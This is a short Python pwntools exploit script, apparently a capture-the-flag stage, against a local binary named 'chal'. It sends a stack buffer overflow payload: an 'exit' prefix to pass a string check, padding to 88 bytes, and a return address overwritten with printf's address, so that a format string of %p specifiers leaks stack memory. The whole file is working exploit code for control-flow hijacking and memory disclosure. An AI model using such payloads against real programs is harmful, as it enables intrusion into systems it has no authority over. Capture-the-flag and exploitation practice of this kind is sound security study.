#!/usr/bin/env python3
import os
os.environ["TERM"]="xterm"
from pwn import *
context.binary=ELF("/work/waf/waf/chal",checksec=False)
context.log_level="error"

PRINTF=0x4010d4
MAIN=0x4012a2

def go(fmt):
    p=process("/work/waf/waf/chal")
    p.recvuntil(b">> ")
    # buf must start "exit" to reach ret; but then printf(buf) prints "exit%..." — strncmp needs first4="exit"
    # rdi at ret = &buf. So buf = "exit" + fmt ... then pad to 88 + ret=printf ; after printf returns,
    # put MAIN so it loops (main re-runs). Keep everything NUL-free before the ret.
    body = b"exit" + fmt
    body = body.ljust(88, b"A")
    pay = body + p64(PRINTF)   # single ret; upper nulls ok
    p.send(pay)
    time.sleep(0.3)
    out=p.recv(timeout=1)
    p.close()
    return out

print(repr(go(b"|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|")[:300]))
